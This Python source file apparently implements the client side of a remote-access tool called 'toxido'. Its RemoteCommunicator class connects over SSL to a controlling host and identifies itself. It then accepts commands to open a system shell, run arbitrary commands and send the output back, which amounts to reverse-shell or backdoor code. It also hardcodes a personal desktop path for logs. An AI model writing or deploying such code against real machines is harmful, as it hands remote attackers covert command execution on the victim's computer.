from core_utils.session import SSLClient
import socket
import errno
import sys
import ssl
from shell import shell
from core_utils.logger import log, Level

class RemoteCommunicator(SSLClient):
    _DEFAULT_TIMEOUT = 180
    _IDENTIFIER = "0x1234567890"
    _EOL = "\x03\x03EOLEOLEOL"
    _SELF_SHUTDOWN_OUT = "SELF_SHUTDOWN"
    _SUCCESS_CREATE_CMD_OUT = "SUCCESS_CREATE_CMD"
    _SUCCESS_CLOSE_CMD_OUT = "SUCCESS_CLOSE_CMD"
    _CMD_TEMPLATE_OUT = "OUTPUT {stdout}"
    _COMMAND_PATTERN = "COMMAND\x03\x03ARGS" + _EOL

    def __init__(self, local_toxido_ip, local_toxido_port):
        super(RemoteCommunicator, self).__init__(local_toxido_ip, local_toxido_port)
        self.set_timeout(self._DEFAULT_TIMEOUT)
        self._cmd_obj = None

    def _send_identifier(self):
        """ sends identifier to local_toxido for identifying himself as remote_toxido"""
        self.send_data(self._IDENTIFIER)

    def connect(self):
        super(RemoteCommunicator, self).connect()
        self._send_identifier()

    def handle_command(self, data):
        if data:
            command, arg = data[:-1 * len(self._EOL)].split("\x03\x03")
            return self.COMMAND_DICT[command](self, arg)
        # if no data, session is closed.
        self.close()
        return self._SELF_SHUTDOWN_OUT

    def close(self):
        self._close_cmd()
        super(RemoteCommunicator, self).close()
        self.exit()

    def exit(self):
        log("closing main process", Level.INFO)
        sys.exit(0)

    def _get_shutdown_command(self, args=None):
        """shutdown, args is ignored."""
        return self._SELF_SHUTDOWN_OUT

    def loop_get_commands(self):
        try:
            while True:
                data = self.recv_data()
                next_data = data
                while next_data and self._EOL not in data:
                    next_data = self.recv_data()
                    data += next_data

                out = self.handle_command(data)
                self.send_data(out)
        except ssl.SSLError as ssl_error:
            if ssl_error.message == 'The read operation timed out':
                log("Timeout when reading from socket [{0} seconds passed], going down.".format(self._DEFAULT_TIMEOUT),
                    Level.FATAL,
                    file_destination=r"C:\Users\raz\Desktop\tox_log.txt")
            else:
                raise
        except socket.error as e:
            if e.errno == errno.ECONNRESET:
                log("Connected refused to server", Level.CRITICAL, file_destination=r"C:\Users\raz\Desktop\tox_log.txt")
            else:
                raise

    def _open_cmd(self, args=None):
        """create shell, argument is ignored."""
        self._cmd_obj = shell.create_shell()
        log("CREATED_CMD_SUCCESS", Level.INFO)
        return self._SUCCESS_CREATE_CMD_OUT

    def _close_cmd(self, args=None):
        if self._cmd_obj:
            self._cmd_obj.close()
        return self._SUCCESS_CLOSE_CMD_OUT

    def _input_cmd_command(self, args):
        data = self._cmd_obj.run(args)
        return self._CMD_TEMPLATE_OUT.format(stdout=data)

    def send_data(self, data):
        super(RemoteCommunicator, self).send_data(data + self._EOL)

    COMMAND_DICT = {"SHUTDOWN": _get_shutdown_command, "CMD_IN": _input_cmd_command, "CMD_OPEN": _open_cmd, "CMD_CLOSE": _close_cmd}

